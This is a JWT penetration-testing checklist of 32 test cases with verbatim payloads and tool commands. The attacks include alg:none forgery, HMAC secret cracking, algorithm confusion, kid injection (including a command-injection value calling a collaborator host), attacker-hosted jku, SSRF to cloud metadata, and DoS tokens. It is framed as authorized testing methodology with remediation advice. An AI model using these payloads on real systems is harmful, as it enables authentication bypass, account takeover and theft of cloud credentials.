# JWT — Checklist

Expert per-attack **test-case matrix** for JWT — in testing order, impact-first. Each card: where to inject, steps, expected result, verbatim payload, impact, severity, CVSS, tools, references.

*32 test cases. Source: expert checklist matrix (12/14-col). Payloads shown verbatim in code blocks.*

---

## JWT-001 — Discover every JWT in the app
**Test Category:** Recon &amp; Decode · **Severity:** Info · **CVSS:** 0.0 (N/A)

**Where to Test / Injection Point:** Cookies, Authorization header, URL/fragment, JSON body, OAuth id/access, email reset/verify/magic-login links, invitation/referral tokens

**Test Steps:** 1. Enumerate ALL tokens - not just the session: Authorization: Bearer, cookies, URL/fragment, JSON body, OAuth id_token/access_token.<br>2. Critically include EMAIL links: password-reset, email-verify, magic-login, and invitation/referral/payment tokens (often forgotten JWTs).<br>3. Note where each token is USED for authz (an endpoint that returns your data).

**Expected Result:** A complete inventory of every JWT and the endpoints that trust it.

**Payload Example:**

```
Bearer eyJ... ; Cookie: session=eyJ... ; /reset?token=eyJ... ; /invite?t=eyJ...
```

**Impact:** Missing the reset-link or invitation JWT means missing the highest-impact (pre-auth) bug.

**Tools:** Burp Suite Pro, jwt_tool

**References:** CWE-347; PortSwigger Web Security Academy: JWT attacks

---

## JWT-002 — Decode &amp; inventory header/claims + pull JWKS
**Test Category:** Recon &amp; Decode · **Severity:** Info · **CVSS:** 0.0 (N/A)

**Where to Test / Injection Point:** Each discovered token

**Test Steps:** 1. Decode header + payload; record alg, kid, jku/x5u/jwk/x5c, and ALL claims (sub, role/scope, aud, iss, exp, jti, tenant).<br>2. Pull the public key/JWKS: /.well-known/jwks.json, /.well-known/openid-configuration.<br>3. Note library/issuer hints (typ, error strings) for CVE matching.

**Expected Result:** A decoded map of each token's algorithm, key headers, claims, and the server's JWKS.

**Payload Example:**

```
python3 -c "import jwt;print(jwt.get_unverified_header(t));print(jwt.decode(t,options={'verify_signature':False}))"
curl -s https://target/.well-known/jwks.json | jq .
```

**Impact:** Drives every downstream attack: alg selects the forge path, claims select the tamper target.

**Tools:** jwt_tool, Burp JWT Editor, jq

**References:** CWE-347; PortSwigger Web Security Academy: JWT attacks

---

## JWT-003 — Baseline — is the signature actually verified?
**Test Category:** Baseline — Signature Verification · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** An endpoint that USES the token for authz (returns your data)

**Test Steps:** 1. Tamper a claim but KEEP the original signature -&gt; accepted? (= no verification, Critical).<br>2. Strip the signature (header.payload.) -&gt; accepted?<br>3. Garbage signature -&gt; accepted?<br>4. CRITICAL: confirm the tampered claim CHANGED BEHAVIOUR (admin/other-user data), not merely 'accepted'.

**Expected Result:** A token with a tampered claim and invalid/absent signature is accepted AND changes behaviour.

**Payload Example:**

```
NOSIG=$(echo $TOKEN | cut -d. -f1,2).  ; curl $URL -H "Authorization: Bearer $NOSIG"
```

**Impact:** No signature verification = trivially forge any identity = full auth bypass / ATO.

**Tools:** jwt_tool -M at, Burp JWT Editor

**References:** CWE-347; CWE-345; PortSwigger Web Security Academy: JWT attacks

---

## JWT-004 — alg:none signature stripping
**Test Category:** Forge — Algorithm · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Tokens where the server may honour alg:none

**Test Steps:** 1. Set header alg to none and remove the signature (empty 3rd segment).<br>2. Try filter-bypass casings: none, None, NONE, nOnE, 'none ', none\x00.<br>3. Tamper role/sub; confirm acceptance + behaviour change.

**Expected Result:** A none-algorithm token with no signature is accepted and its forged claims take effect.

**Payload Example:**

```
python3 jwt_tool.py $TOKEN -X a
python3 poc/alg_none.py $TOKEN --claim role=admin --claim sub=1337
```

**Impact:** Forge any identity with no key needed - auth bypass / ATO / privilege escalation.

**Tools:** jwt_tool -X a, poc/alg_none.py

**References:** CWE-347; python-jwt/pyjwt alg:none; PortSwigger Web Security Academy: JWT attacks

---

## JWT-005 — HS256 weak-secret crack -&gt; re-sign
**Test Category:** Forge — Key Recovery · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** HMAC-signed tokens (HS256/384/512)

**Test Steps:** 1. Crack the secret OFFLINE: hashcat -m 16500 token.txt wordlist (try wallarm/jwt-secrets defaults first).<br>2. Also hunt leaked secrets in JS bundles/.env/git/mobile.<br>3. Re-sign a tampered token with the cracked secret.

**Expected Result:** The HMAC secret is recovered and a forged, validly-signed token is accepted.

**Payload Example:**

```
hashcat -a 0 -m 16500 token.txt jwt.secrets.list
python3 poc/forge_token.py --alg HS256 --secret 'CRACKED' --claim role=admin $TOKEN
```

**Impact:** Full token forgery once the secret is known - auth bypass / ATO. Default/leaked secrets are common.

**Tools:** hashcat -m 16500, john, jwt_tool -C, wallarm/jwt-secrets

**References:** CWE-347; CWE-521; PortSwigger Web Security Academy: JWT attacks

---

## JWT-006 — RS256 -&gt; HS256 algorithm confusion
**Test Category:** Forge — Algorithm · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Asymmetric (RS256) tokens where the public key is obtainable

**Test Steps:** 1. Get the RSA public key (PEM) from JWKS or the TLS cert (public by design).<br>2. HMAC-sign the token as HS256 using the PUBLIC KEY as the HMAC secret.<br>3. Try PEM with/without trailing newline + DER variants (formatting is the usual snag).

**Expected Result:** The server verifies the HS256 token using the public key as an HMAC secret and accepts it.

**Payload Example:**

```
python3 jwt_tool.py $TOKEN -X k -pk public.pem
python3 poc/rs256_to_hs256.py $TOKEN --pubkey public.pem --claim role=admin
```

**Impact:** Forge any token using only the PUBLIC key - a config bug, not a key leak. Auth bypass / ATO.

**Tools:** jwt_tool -X k, poc/rs256_to_hs256.py, Burp JWT Editor

**References:** CWE-347; CVE-2015-9235 (jsonwebtoken); CVE-2016-5431 (gree/php-jose key confusion); PortSwigger Web Security Academy: JWT attacks

---

## JWT-007 — Recover RSA public key from two tokens
**Test Category:** Forge — Key Recovery · **Severity:** High · **CVSS:** 7.4 (CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** RS256 tokens with NO published JWKS

**Test Steps:** 1. Capture two different valid tokens.<br>2. Run rsa_sign2n to derive the RSA public key from the pair.<br>3. Then apply RS256-&gt;HS256 confusion with the recovered key.

**Expected Result:** The RSA public key is recovered, enabling the algorithm-confusion forge.

**Payload Example:**

```
cd rsa_sign2n/standalone && python3 jwt_forgery.py $TOKEN_1 $TOKEN_2
```

**Impact:** Unlocks RS256-&gt;HS256 even when the key isn't published - auth bypass / ATO.

**Tools:** rsa_sign2n, jwt_tool

**References:** CWE-347; PortSwigger Web Security Academy: JWT attacks

---

## JWT-008 — kid injection — path traversal to empty key
**Test Category:** Forge — kid Header · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** kid header used to locate the verification key on disk

**Test Steps:** 1. Point kid at a file with known/empty content: ../../../../dev/null.<br>2. The key becomes empty -&gt; sign HS256 with secret "".<br>3. Other known-content files: /proc/sys/kernel/randomize_va_space (sign with '0\n'/'1\n').

**Expected Result:** The server loads an attacker-known key file and accepts a token signed with that content.

**Payload Example:**

```
python3 poc/kid_injection.py $TOKEN --kid "../../../../dev/null" --secret "" --claim role=admin
```

**Impact:** Forge tokens by controlling the key path - auth bypass / ATO.

**Tools:** poc/kid_injection.py, jwt_tool

**References:** CWE-347; CWE-22; PortSwigger Web Security Academy: JWT attacks

---

## JWT-009 — kid injection — SQL injection returns attacker key
**Test Category:** Forge — kid Header · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** kid used in a DB lookup for the key

**Test Steps:** 1. Inject SQL into kid to return a key you control: nonexistent' UNION SELECT 'attackerkey'-- -.<br>2. Sign HS256 with 'attackerkey'.<br>3. Also test blind authz/error oracle: 1' OR '1'='1.

**Expected Result:** The kid SQLi returns your chosen key and the forged token verifies against it.

**Payload Example:**

```
kid: nonexistent' UNION SELECT 'attackerkey'-- -   then sign HS256 with attackerkey
```

**Impact:** Token forgery via SQLi in kid - auth bypass; the SQLi itself may be independently exploitable.

**Tools:** poc/kid_injection.py, jwt_tool -X i

**References:** CWE-347; CWE-89; PortSwigger Web Security Academy: JWT attacks

---

## JWT-010 — kid injection — command injection / LFI / SSRF
**Test Category:** Forge — kid Header · **Severity:** Critical · **CVSS:** 10.0 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H)

**Where to Test / Injection Point:** kid flows into a file read / shell / HTTP fetch

**Test Steps:** 1. Command injection (RCE, independent of forging): kid: key|id ; key;curl http://$COLLAB/kid ; $(id).<br>2. LFI: kid: php://filter/convert.base64-encode/resource=index.php -&gt; source.<br>3. SSRF: kid: http://169.254.169.254/latest/meta-data/iam/security-credentials/ -&gt; cloud creds.

**Expected Result:** The kid value executes a command, reads a file, or triggers a server-side fetch.

**Payload Example:**

```
kid: key;curl http://$COLLAB/kid
kid: http://169.254.169.254/latest/meta-data/iam/security-credentials/
```

**Impact:** kid becomes an RCE/LFI/SSRF primitive - Critical (SSRF-&gt;cloud metadata is a top chain).

**Tools:** jwt_tool -X i, SSRFmap

**References:** CWE-347; CWE-78; CWE-918; HackTricks JWT

---

## JWT-011 — jku / x5u — attacker-hosted JWKS (+ SSRF)
**Test Category:** Forge — Key Header · **Severity:** Critical · **CVSS:** 10.0 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H)

**Where to Test / Injection Point:** jku/x5u header pointing at a JWKS URL

**Test Steps:** 1. Serve a JWKS containing YOUR public key (poc/jwks_server.py + ngrok/Collaborator).<br>2. Set jku to your host and sign with your private key.<br>3. Host-allowlist bypass: https://trusted.com@$YOURHOST/jwks.json ; trusted.com.$YOURHOST ; #trusted.com ; open-redirect.<br>4. Even if the key isn't honoured, a Collaborator jku confirms SSRF.

**Expected Result:** The server fetches your JWKS and verifies the token with your key (and/or an SSRF callback fires).

**Payload Example:**

```
python3 jwt_tool.py $TOKEN -X s -ju https://$YOURHOST/jwks.json -pr poc/jwt_private.pem
```

**Impact:** Forge any token via attacker-controlled keys + SSRF (jku-&gt;169.254.169.254-&gt;IAM creds) - Critical.

**Tools:** poc/jwks_server.py, jwt_tool -X s, Collaborator

**References:** CWE-347; CWE-918; PortSwigger Web Security Academy: JWT attacks

---

## JWT-012 — jwk — embedded public key
**Test Category:** Forge — Key Header · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Header that trusts an embedded jwk

**Test Steps:** 1. Embed YOUR public key in the header jwk and sign with YOUR private key (no hosting needed).<br>2. Burp JWT Editor -&gt; Attack -&gt; Embedded JWK (one click).<br>3. Confirm acceptance + behaviour change.

**Expected Result:** The server trusts the header-embedded key and accepts your self-signed token.

**Payload Example:**

```
python3 poc/jwk_inject.py $TOKEN --claim role=admin --claim sub=1337
```

**Impact:** Self-contained token forgery, no hosting - auth bypass / ATO.

**Tools:** poc/jwk_inject.py, jwt_tool -X i, Burp JWT Editor

**References:** CWE-347; CVE-2018-0114 (node-jose); PortSwigger Web Security Academy: JWT attacks

---

## JWT-013 — x5c — self-signed certificate chain
**Test Category:** Forge — Key Header · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Header that trusts an x5c cert chain

**Test Steps:** 1. Generate a self-signed cert; embed its chain in x5c; sign with its key.<br>2. Confirm acceptance.

**Expected Result:** The server trusts the self-signed x5c chain and accepts the token.

**Payload Example:**

```
openssl req -x509 -newkey rsa:2048 -keyout x5c.key -out x5c.crt -days 7 -nodes -subj "/CN=poc"
python3 poc/jwk_inject.py $TOKEN --x5c x5c.crt --key x5c.key --claim role=admin
```

**Impact:** Token forgery via self-signed x5c - auth bypass / ATO.

**Tools:** poc/jwk_inject.py, openssl

**References:** CWE-347; PortSwigger Web Security Academy: JWT attacks

---

## JWT-014 — ES256 psychic signature (CVE-2022-21449)
**Test Category:** Forge — Algorithm · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** ECDSA (ES256/384/512) tokens on Java 15-18

**Test Steps:** 1. Craft an ECDSA signature of (r=0, s=0) - a blank signature.<br>2. Send; on vulnerable Java it verifies as valid.<br>3. Tamper claims freely.

**Expected Result:** A blank (r=s=0) ECDSA signature is accepted on vulnerable Java, allowing arbitrary forgery.

**Payload Example:**

```
python3 jwt_tool.py $TOKEN -X psychic
```

**Impact:** Universal forgery on ES256 with vulnerable Java - auth bypass / ATO.

**Tools:** jwt_tool -X psychic

**References:** CWE-347; CVE-2022-21449 (Psychic Signature)

---

## JWT-015 — sub / user_id swap (horizontal / IDOR)
**Test Category:** Claim — Horizontal · **Severity:** High · **CVSS:** 7.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:L/A:N)

**Where to Test / Injection Point:** sub/user_id/uid claim, once a forge primitive works

**Test Steps:** 1. With a working forge (none/HS/pubkey/jwk), change sub to a victim's id.<br>2. Request an endpoint that returns per-user data.<br>3. Confirm you see data that is NOT yours.

**Expected Result:** The forged token with a swapped sub returns another user's data.

**Payload Example:**

```
"sub":"<victim_id>"   (re-sign with the working forge primitive)
```

**Impact:** Horizontal account takeover / IDOR across users.

**Tools:** jwt_tool, poc/forge_token.py

**References:** CWE-347; CWE-639; PortSwigger Web Security Academy: JWT attacks

---

## JWT-016 — role / isAdmin / scope bump (vertical priv-esc)
**Test Category:** Claim — Vertical · **Severity:** Critical · **CVSS:** 9.6 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:N)

**Where to Test / Injection Point:** role/roles/isAdmin/scope/groups/permissions claims

**Test Steps:** 1. Bump privilege in the forged token: role=admin, isAdmin=true, scope='... admin', groups=['administrators'].<br>2. Reach an admin-only endpoint/UI.<br>3. Confirm the privileged action succeeds.

**Expected Result:** The privilege-bumped token reaches admin-only functionality.

**Payload Example:**

```
"role":"admin"   "isAdmin":true   "scope":"read write admin"
```

**Impact:** Vertical privilege escalation to admin/staff - full app compromise.

**Tools:** jwt_tool, poc/forge_token.py

**References:** CWE-347; CWE-287; PortSwigger Web Security Academy: JWT attacks

---

## JWT-017 — tenant / org swap (cross-tenant)
**Test Category:** Claim — Cross-Tenant · **Severity:** Critical · **CVSS:** 9.6 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:N)

**Where to Test / Injection Point:** tenant/org/account_id claims in multi-tenant apps

**Test Steps:** 1. Change tenant/org/account_id to another tenant's value in the forged token.<br>2. Access tenant-scoped data.<br>3. Confirm you read another tenant's data.

**Expected Result:** The forged token with a swapped tenant returns another tenant's data.

**Payload Example:**

```
"tenant":"<other_tenant>"   "org":"<other_org>"
```

**Impact:** Cross-tenant data breach - Critical in SaaS/multi-tenant apps.

**Tools:** jwt_tool

**References:** CWE-347; CWE-639; PortSwigger Web Security Academy: JWT attacks

---

## JWT-018 — email / email_verified tamper (OAuth ATO)
**Test Category:** Claim — Identity · **Severity:** Critical · **CVSS:** 9.1 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** email/email_verified claims trusted for account linking

**Test Steps:** 1. Set email to a victim's address and email_verified=true in the forged token.<br>2. Trigger account linking / SSO sign-in.<br>3. Confirm takeover of the victim's account.

**Expected Result:** The app links/authenticates based on the forged email claim, taking over the victim account.

**Payload Example:**

```
"email":"victim@corp.com"   "email_verified":true
```

**Impact:** Account takeover via trusted-email claim - a classic OAuth/JWT ATO.

**Tools:** jwt_tool

**References:** CWE-347; CWE-287; HackTricks JWT

---

## JWT-019 — exp not enforced / no exp / nbf bypass
**Test Category:** Lifecycle · **Severity:** High · **CVSS:** 7.5 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N)

**Where to Test / Injection Point:** exp/nbf claims

**Test Steps:** 1. Replay an old/expired captured token -&gt; still accepted?<br>2. Remove the exp claim (or set exp=9999999999) in a forged token.<br>3. Test nbf=0 bypass.

**Expected Result:** An expired or exp-less token is accepted.

**Payload Example:**

```
replay $OLD_EXPIRED_TOKEN ; or forge with exp removed / nbf=0
```

**Impact:** Indefinite token validity - stolen/old tokens never die; extends ATO window.

**Tools:** jwt_tool, curl

**References:** CWE-347; CWE-613; PortSwigger Web Security Academy: JWT attacks

---

## JWT-020 — Revocation failure (valid after logout/pw change)
**Test Category:** Lifecycle · **Severity:** High · **CVSS:** 7.5 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N)

**Where to Test / Injection Point:** Session/refresh tokens after logout or password change

**Test Steps:** 1. Capture a token; log out (or change the password).<br>2. Replay the token at an authz endpoint.<br>3. Still 200 = no server-side revocation.

**Expected Result:** The token remains valid after logout / password change.

**Payload Example:**

```
1) save token  2) /logout  3) replay token at $URL -> still 200?
```

**Impact:** Stolen tokens survive logout/password reset - undermines the primary containment control.

**Tools:** Burp Repeater, curl

**References:** CWE-347; CWE-613; PortSwigger Web Security Academy: JWT attacks

---

## JWT-021 — Replay — one-time reset/magic-login JWT reused
**Test Category:** Lifecycle · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Password-reset / magic-login / email-verify JWTs (no jti)

**Test Steps:** 1. Use a reset/magic-login JWT once, then reuse it.<br>2. If it works again (no jti / no single-use tracking), it's replayable.<br>3. Combine with a forgeable signature for mass ATO.

**Expected Result:** A one-time-use link token is accepted more than once.

**Payload Example:**

```
reuse /reset?token=eyJ...  after it was already consumed
```

**Impact:** Replayable reset tokens -&gt; account takeover; forgeable reset JWT -&gt; mass ATO.

**Tools:** Burp Repeater

**References:** CWE-347; CWE-294; PortSwigger Web Security Academy: JWT attacks

---

## JWT-022 — Refresh-token reuse / rotation failure
**Test Category:** Lifecycle · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** OAuth refresh tokens at the token endpoint

**Test Steps:** 1. Use a refresh token, then reuse the SAME (already-rotated) one.<br>2. If a new access token is issued, rotation/reuse-detection is broken.<br>3. Note whether reuse invalidates the family (it should).

**Expected Result:** An already-rotated refresh token still yields new access tokens.

**Payload Example:**

```
replay a rotated refresh_token at /oauth/token
```

**Impact:** Persistent access from a single stolen refresh token - long-lived ATO.

**Tools:** Burp Repeater

**References:** CWE-347; CWE-613; PortSwigger Web Security Academy: JWT attacks

---

## JWT-023 — aud / iss confusion (cross-service replay)
**Test Category:** Lifecycle · **Severity:** High · **CVSS:** 7.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:L/A:N)

**Where to Test / Injection Point:** Multi-service / multi-env / multi-client deployments

**Test Steps:** 1. Replay a token issued for another service/env/client at the target.<br>2. Tamper aud/iss on a forged token; test cross-audience acceptance.<br>3. Confirm the wrong-audience token is accepted.

**Expected Result:** A token minted for a different audience/issuer is accepted by the target.

**Payload Example:**

```
curl $URL -H "Authorization: Bearer $TOKEN_FROM_OTHER_SERVICE"
```

**Impact:** Token minted elsewhere (e.g. a low-trust service) grants access here - confused-deputy access.

**Tools:** jwt_tool, curl

**References:** CWE-347; CWE-345; PortSwigger Web Security Academy: JWT attacks

---

## JWT-024 — OIDC id_token attacks
**Test Category:** OIDC id_token · **Severity:** Critical · **CVSS:** 9.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:H/A:N)

**Where to Test / Injection Point:** OIDC Relying-Party sign-in / callback

**Test Steps:** 1. aud as ARRAY: does the RP accept any aud in the list? azp not checked with multiple aud = confused deputy.<br>2. nonce replay: resend a captured id_token (or drop the nonce) -&gt; sign in as victim.<br>3. at_hash/c_hash substitution: swap the access_token/code, keep the id_token.<br>4. id_token as access_token at /userinfo. (iss,sub) keying vs email-only keying -&gt; cross-IdP takeover.

**Expected Result:** The RP mis-validates the id_token (aud/azp/nonce/at_hash), enabling sign-in as the victim.

**Payload Example:**

```
"aud":["rp-client","attacker-client"] ; drop "nonce" and replay id_token at the callback
```

**Impact:** OIDC account takeover / cross-IdP identity confusion - Critical.

**Tools:** Burp, jwt_tool

**References:** CWE-347; CWE-287; PortSwigger Web Security Academy: JWT attacks

---

## JWT-025 — JWE (encrypted JWT) attacks
**Test Category:** JWE · **Severity:** High · **CVSS:** 7.4 (CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** 5-part tokens (header.encKey.iv.ciphertext.tag) with enc+alg

**Test Steps:** 1. Nested alg confusion: downgrade to dir/none-style key handling.<br>2. RSA1_5 Bleichenbacher/Million-Message padding oracle.<br>3. Weak key management: alg=dir with a guessable/leaked CEK; weak PBES2 passphrase (crack like HMAC).

**Expected Result:** The JWE is decrypted/forged via a padding oracle or weak/known key.

**Payload Example:**

```
downgrade alg to "dir" with a leaked CEK ; RSA1_5 padding-oracle on encKey
```

**Impact:** Decrypt/forge encrypted tokens -&gt; full token control - Critical.

**Tools:** jwt_tool, jwe tooling

**References:** CWE-347; CWE-327; HackTricks JWT

---

## JWT-026 — Parser confusion (crit / typ / cty / duplicates)
**Test Category:** Parser Confusion · **Severity:** High · **CVSS:** 7.4 (CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Gateway-vs-backend or lib parsing divergence

**Test Steps:** 1. crit header lists a param the server MUST understand; some libs ignore it -&gt; bypass required checks.<br>2. typ/cty confusion (JWT vs JWS vs JWE) -&gt; mis-route -&gt; signature skipped.<br>3. Duplicate alg/claims: the gateway reads one, the backend another (smuggle a param).

**Expected Result:** A parsing divergence causes verification to be skipped or a required check to be bypassed.

**Payload Example:**

```
duplicate "alg" headers ; "crit":["b64"] ignored ; typ/cty mismatch
```

**Impact:** Signature-skip / required-check bypass via parser divergence - auth bypass.

**Tools:** Burp, jwt_tool

**References:** CWE-347; CWE-436; PortSwigger Web Security Academy: JWT attacks

---

## JWT-027 — JWT / JWE denial-of-service (if in scope)
**Test Category:** Availability · **Severity:** High · **CVSS:** 7.5 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H)

**Where to Test / Injection Point:** PBES2/JWE headers; AUTHORIZE first

**Test Steps:** 1. PBES2 p2c bomb: header p2c=100000000 -&gt; server runs 100M PBKDF2 rounds per verify (CPU hang).<br>2. JWE zip=DEF decompression bomb: tiny payload expands to GBs.<br>3. Oversized RSA modulus in jwk/x5c. Show the ONE-request tiny-&gt;huge ratio; never flood.

**Expected Result:** A single tiny token causes multi-second CPU / memory blowup on verification.

**Payload Example:**

```
"alg":"PBES2-HS256+A128KW","p2c":100000000
"zip":"DEF"  (decompression bomb)
```

**Impact:** Cache/CPU-exhaustion DoS from one crafted token - availability impact (scope required).

**Tools:** poc/jwe_dos_token.py, jwt_tool

**References:** CWE-347; CWE-400; PortSwigger Web Security Academy: JWT attacks

---

## JWT-028 — Token storage &amp; leakage
**Test Category:** Storage &amp; Leakage · **Severity:** Medium · **CVSS:** 6.5 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N)

**Where to Test / Injection Point:** URL/Referer/logs/localStorage; cookie flags; payload contents

**Test Steps:** 1. Check tokens in URLs (leak via Referer/logs/history), localStorage (XSS-stealable), and missing cookie flags (HttpOnly/Secure/SameSite).<br>2. Decode the payload for sensitive data (PII/secrets) stored in claims.<br>3. Note any token in a shareable/loggable location.

**Expected Result:** A token is exposed via URL/logs/localStorage, or sensitive data sits in the payload.

**Payload Example:**

```
token in ?access_token= (Referer leak) ; sensitive claims in payload ; cookie missing HttpOnly
```

**Impact:** Token theft via leakage -&gt; ATO; sensitive-data-in-payload disclosure.

**Tools:** Burp, Browser DevTools

**References:** CWE-347; CWE-522; CWE-200; PortSwigger Web Security Academy: JWT attacks

---

## JWT-029 — Non-session JWT manipulation across features
**Test Category:** App-Specific (feature checklists) · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Invitation/referral/payment/order/points/report/scheduling tokens

**Test Steps:** 1. Apply the same forge+claim-tamper flow to feature JWTs, not just the session: invitation, referral, payment, order, points, report, scheduling tokens.<br>2. Swap the embedded id/amount/role/target in each.<br>3. Confirm the feature-level abuse (e.g. free credit, others' orders, elevated invite).

**Expected Result:** A tampered feature token grants unintended access/value in that workflow.

**Payload Example:**

```
invite token role=owner ; payment token amount lowered ; order token order_id=<victim>
```

**Impact:** Business-logic abuse via forged feature tokens - IDOR/privilege/financial impact per feature.

**Tools:** jwt_tool, Burp Repeater

**References:** CWE-347; CWE-639; PortSwigger Web Security Academy: JWT attacks

---

## JWT-030 — High-impact JWT chains
**Test Category:** Impact — Chains · **Severity:** Critical · **CVSS:** 10.0 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H)

**Where to Test / Injection Point:** Confirmed primitive + a second sink

**Test Steps:** 1. jku/kid -&gt; SSRF -&gt; 169.254.169.254 -&gt; IAM creds (hand to the SSRF kit).<br>2. Forgeable/replayable reset-JWT -&gt; mass account takeover.<br>3. XSS -&gt; steal localStorage token -&gt; ATO.<br>4. RS256-&gt;HS256 -&gt; admin forge -&gt; full compromise.

**Expected Result:** A JWT weakness chains into cloud-cred theft, mass ATO, or full admin compromise.

**Payload Example:**

```
jku=http://169.254.169.254/... ; reset-JWT forge for any email ; XSS token exfil
```

**Impact:** Compound Critical: cloud takeover / mass ATO / full admin from a single JWT flaw.

**Tools:** jwt_tool, SSRFmap, Burp

**References:** CWE-347; CWE-918; PortSwigger Web Security Academy: JWT attacks

---

## JWT-031 — False-positive filter
**Test Category:** Validation &amp; Reporting · **Severity:** Info · **CVSS:** 0.0 (N/A)

**Where to Test / Injection Point:** Before reporting any candidate

**Test Steps:** 1. Reject: 'I decoded a token' (observing != vuln); 'it uses HS256' (not a bug by itself); 'alg:none exists in the spec' (only a bug if ACCEPTED); accepted-but-ignored (the server accepted a tampered token but behaviour did NOT change).<br>2. Require: the server ACCEPTED a token whose contents you controlled AND behaviour CHANGED (admin/other-user/cross-tenant data).<br>3. Confirm on PRODUCTION keys/endpoint.

**Expected Result:** A forged/tampered token that is accepted AND demonstrably changes behaviour.

**Payload Example:**

```
forged role=admin -> reaches /admin (behaviour changed) ; not merely '200 accepted'
```

**Impact:** Protects credibility; JWT is dense with decoded-a-token / accepted-but-ignored false positives.

**Tools:** jwt_tool, manual

**References:** CWE-347; PortSwigger Web Security Academy: JWT attacks

---

## JWT-032 — Client-facing impact &amp; PoC package
**Test Category:** Validation &amp; Reporting · **Severity:** Info · **CVSS:** 0.0 (N/A)

**Where to Test / Injection Point:** Confirmed finding, pre-submission

**Test Steps:** 1. Lead with impact (auth bypass/ATO &gt; admin &gt; cross-tenant).<br>2. Provide: original + forged token (both decoded), the exact forge command, and the accepted request/response showing the behaviour change.<br>3. Set CVSS 3.1 + CWE-347 (+ CWE-345/287/639/918/400 as applicable). Remediation: verify signatures with a pinned algorithm allowlist (reject none), strong/rotated secrets, ignore client alg, validate aud/iss/exp/nbf/jti, don't fetch keys from client-controlled jku/kid, server-side revocation.<br>4. Forge into your OWN accounts, crack OFFLINE, clean up; de-dupe to one root cause.

**Expected Result:** A reproducible, correctly-rated, safe PoC with clear remediation.

**Payload Example:**

```
PoC: decoded original+forged token + forge command + accepted request/response + CVSS + CWE-347.
```

**Impact:** Converts the finding into a defensible Critical/High report at the correct severity.

**Tools:** jwt_tool, CVSS calculator, JWT_REPORT_TEMPLATE.md

**References:** CWE-347; CWE-287; FIRST CVSS v3.1; Auth0 'Critical vulnerabilities in JSON Web Token libraries'  |  TOP REFERENCES: Auth0 'Critical vulnerabilities in JWT libraries'; PortSwigger Academy JWT; PayloadsAllTheThings; ticarpi/jwt_tool; RFC 7519/7515/8725

---
